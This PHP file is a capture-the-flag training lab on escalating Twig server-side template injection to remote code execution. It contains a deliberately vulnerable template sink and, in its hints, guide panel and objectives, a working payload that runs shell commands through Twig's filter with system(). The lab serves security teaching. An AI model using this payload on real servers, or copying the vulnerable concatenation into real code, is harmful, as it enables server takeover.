<?php
// Lab S2 — SSTI → RCE (Advanced)
// Vulnerability: same Twig sink as S1 but NO flag variable — RCE required
require_once __DIR__ . '/includes/helpers.php';
require_once __DIR__ . '/vendor/autoload.php';

$lab_id   = 's2';
$flag_file = 'lab_s2.txt';

$hints = [
    1 => "Math confirms evaluation — but <code>{{flag}}</code> doesn't exist this time. The flag is only in a file on the server. You need code execution.",
    2 => "Twig's built-in <code>|filter</code> accepts a PHP callable string as its argument. Any PHP function that executes code and prints output can be used as a side-channel.",
    3 => "Try: <code>{{[\"cat /flags/lab_s2.txt\"]|filter(\"system\")}}</code> — Twig calls <code>system()</code> on each array element, and its output is captured in the render buffer and returned as part of the page.",
];

$name       = '';
$output     = null;
$twig_error = null;

// Handle hint reveal
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['reveal_hint'])) {
    reveal_hint($lab_id, (int)$_POST['reveal_hint']);
    header("Location: /ssti_s2.php");
    exit;
}

// Handle flag submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['flag'])) {
    if (check_flag($_POST['flag'], $flag_file)) {
        mark_solved($lab_id);
    } else {
        $_SESSION[flag_error_key($lab_id)] = true;
    }
    header("Location: /ssti_s2.php");
    exit;
}

// Handle reset
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'reset') {
    unset($_SESSION['payloads'][$lab_id]);
    header("Location: /ssti_s2.php");
    exit;
}

// Render greeting
if (isset($_GET['name']) && $_GET['name'] !== '') {
    $name = $_GET['name'];
    log_payload($lab_id, $name, 'name parameter');

    $loader = new \Twig\Loader\ArrayLoader([]);
    $twig   = new \Twig\Environment($loader);

    try {
        // DELIBERATELY VULNERABLE: user input concatenated into template string
        $template = $twig->createTemplate("Hello " . $name . "!");
        // No variables passed — flag only accessible via RCE
        $output = $template->render([]);
    } catch (\Twig\Error\Error $e) {
        $twig_error = $e->getMessage();
    }
}

$solved         = is_solved($lab_id);
$hints_revealed = hints_revealed($lab_id);
$payload_log    = get_payload_log($lab_id);
$flag_error     = !empty($_SESSION[flag_error_key($lab_id)]);
unset($_SESSION[flag_error_key($lab_id)]);

$page_title = 'Lab S2 — SSTI to RCE';
include __DIR__ . '/includes/header.php';
?>

<div class="page lab-page">

  <?php if ($solved): ?>
  <div class="solved-banner">
    <div class="solved-banner-icon">🎉</div>
    <div>
      <div class="solved-banner-text">Lab Complete!</div>
      <div class="solved-banner-sub">You escalated SSTI to RCE using Twig's <code>|filter</code> callable abuse to execute a shell command and read an arbitrary server file.</div>
    </div>
  </div>
  <?php endif; ?>

  <div class="lab-header">
    <div class="lab-header-info">
      <div class="lab-header-meta">
        <span class="badge badge-advanced">Advanced</span>
        <span style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim)">LAB S2</span>
        <span style="font-size:0.7rem;color:var(--text-dim)">🎤 <?= stars(5) ?> Interview · 🎯 <?= stars(4) ?> Hunt</span>
      </div>
      <h1>SSTI &rarr; RCE</h1>
      <p class="lab-header-desc">Same Twig injection sink as S1 — but no <code>flag</code> variable exists in the template context. The flag lives only in a file on the server. You must escalate template injection to remote code execution.</p>
    </div>
    <div class="lab-header-actions">
      <a href="/ssti_s2_interview.php" class="btn btn-ghost btn-sm">Interview Prep</a>
      <form method="post" style="margin:0">
        <input type="hidden" name="action" value="reset">
        <button type="submit" class="btn btn-danger btn-sm" onclick="return confirm('Reset payload log?')">Reset</button>
      </form>
    </div>
  </div>

  <div class="lab-body">
    <div style="display:flex;flex-direction:column;gap:16px;">

      <!-- Simulated App -->
      <div class="panel">
        <div class="panel-header">
          <span class="panel-title">Personalized Greeting</span>
          <span style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim)">GET /greeting?name=<?= h($name) ?></span>
        </div>
        <div class="panel-body">
          <form method="get" action="/ssti_s2.php" style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap;">
            <input type="text" name="name" value="<?= h($name) ?>" placeholder="Enter your name (e.g. Alice)" style="flex:1;min-width:260px;">
            <button type="submit" class="btn btn-primary btn-sm">Greet Me</button>
          </form>

          <?php if ($output !== null): ?>
          <div class="terminal">
            <div style="color:var(--text-dim);font-size:0.7rem;margin-bottom:8px;">// Rendered output</div>
            <pre style="margin:0;white-space:pre-wrap;color:var(--green, #4ade80);font-size:0.9rem;"><?= h($output) ?></pre>
          </div>
          <?php elseif ($twig_error !== null): ?>
          <div class="terminal">
            <div style="color:var(--red);font-size:0.7rem;margin-bottom:8px;">Twig Error</div>
            <pre style="margin:0;white-space:pre-wrap;color:var(--red);font-size:0.8rem;"><?= h($twig_error) ?></pre>
          </div>
          <?php else: ?>
          <p class="text-muted" style="font-size:0.85rem;">Enter a name above to receive your personalized greeting.</p>
          <?php endif; ?>
        </div>
      </div>

      <!-- Vulnerable Code -->
      <div class="panel">
        <div class="panel-header"><span class="panel-title">Vulnerable Source</span></div>
        <div class="panel-body">
          <div class="terminal">
            <span class="comment">// greeting.php</span><br>
            <span class="query">$name = $_GET[<span style="color:var(--orange)">'name'</span>];<br>
<br>
<span style="color:var(--text-dim)">// VULNERABLE: user input concatenated into template string</span><br>
$template = $twig-&gt;createTemplate(<span style="color:var(--orange)">"Hello " . $name . "!"</span>);<br>
<br>
<span style="color:var(--text-dim)">// No variables passed — flag only accessible via RCE</span><br>
$output = $template-&gt;render([]);<br>
echo $output;</span>
          </div>
        </div>
      </div>

      <!-- RCE Guide -->
      <div class="panel">
        <div class="panel-header"><span class="panel-title">Twig 3 RCE Guide</span></div>
        <div class="panel-body" style="font-size:0.875rem;color:var(--text-muted);">
          <p style="margin-bottom:12px;">Twig's built-in <code>|filter</code> extension passes each array element to a PHP callable. Because Twig calls the function directly via PHP's internal dispatch, you can pass a dangerous built-in like <code>system()</code>. Its output is printed to Twig's internal render buffer and returned as part of the page.</p>
          <div style="margin-bottom:10px;font-weight:600;color:var(--text);">Working gadget:</div>
          <div class="terminal" style="margin-bottom:12px;">
            <pre style="margin:0;white-space:pre-wrap;color:var(--orange);font-size:0.82rem;">{{["cat /flags/lab_s2.txt"]|filter("system")}}</pre>
          </div>
          <ol style="padding-left:1.2em;line-height:1.8;">
            <li>Wrap the shell command as a one-element array.</li>
            <li><code>|filter("system")</code> — Twig calls <code>system("cat /flags/lab_s2.txt")</code>.</li>
            <li><code>system()</code> prints the flag to the output buffer; it appears in the rendered page.</li>
          </ol>
        </div>
      </div>

      <!-- Objective -->
      <div class="panel">
        <div class="panel-header"><span class="panel-title">Objective</span></div>
        <div class="panel-body" style="display:flex;flex-direction:column;gap:10px;font-size:0.875rem;color:var(--text-muted);">
          <div>1. Confirm SSTI with <code>{{7*7}}</code> — verify the engine evaluates your input.</div>
          <div>2. Note that <code>{{flag}}</code> does not exist — no variables are passed to this template.</div>
          <div>3. Use <code>{{["cat /flags/lab_s2.txt"]|filter("system")}}</code> to execute a shell command and read the flag.</div>
          <div>4. Submit the flag below.</div>
        </div>
      </div>
    </div>

    <!-- Sidebar -->
    <div style="display:flex;flex-direction:column;gap:16px;">

      <!-- Flag Submission -->
      <div class="panel">
        <div class="panel-header"><span class="panel-title">Submit Flag</span></div>
        <div class="panel-body">
          <?php if ($flag_error): ?>
          <div class="alert alert-error" data-dismiss="4000">Incorrect flag. Keep hunting.</div>
          <?php endif; ?>
          <?php if ($solved): ?>
          <div class="alert alert-success">Flag accepted! Lab complete.</div>
          <?php else: ?>
          <form method="post" class="flag-form">
            <input class="flag-input" type="text" name="flag" placeholder="HUNT{...}" autocomplete="off">
            <button type="submit" class="btn btn-primary btn-full">Submit</button>
          </form>
          <?php endif; ?>
        </div>
      </div>

      <!-- Hints -->
      <div class="panel">
        <div class="panel-header">
          <span class="panel-title">Hints</span>
          <span style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim)"><?= count($hints_revealed) ?>/3 revealed</span>
        </div>
        <div class="panel-body">
          <div class="hints-list">
            <?php for ($i = 1; $i <= 3; $i++): ?>
            <div class="hint-item">
              <div class="hint-header">
                Hint <?= $i ?>
                <?php if (!in_array($i, $hints_revealed, true)): ?>
                <form method="post" style="margin:0">
                  <input type="hidden" name="reveal_hint" value="<?= $i ?>">
                  <button type="submit" class="btn btn-ghost btn-sm">Reveal</button>
                </form>
                <?php endif; ?>
              </div>
              <?php if (in_array($i, $hints_revealed, true)): ?>
              <div class="hint-content"><?= $hints[$i] ?></div>
              <?php endif; ?>
            </div>
            <?php endfor; ?>
          </div>
        </div>
      </div>

      <!-- Payload Log -->
      <div class="panel">
        <div class="panel-header">
          <span class="panel-title">Payload Log</span>
          <span style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim)"><?= count($payload_log) ?> entries</span>
        </div>
        <div class="panel-body">
          <div class="payload-log">
            <?php if ($payload_log): ?>
            <?php foreach (array_slice($payload_log, 0, 10) as $entry): ?>
            <div class="log-entry" title="Click to copy">
              <div class="log-payload"><?= h($entry['payload']) ?></div>
              <div class="log-context"><?= h($entry['context']) ?></div>
            </div>
            <?php endforeach; ?>
            <?php else: ?>
            <div class="log-empty">No payloads yet. Start testing.</div>
            <?php endif; ?>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

<?php include __DIR__ . '/includes/footer.php'; ?>
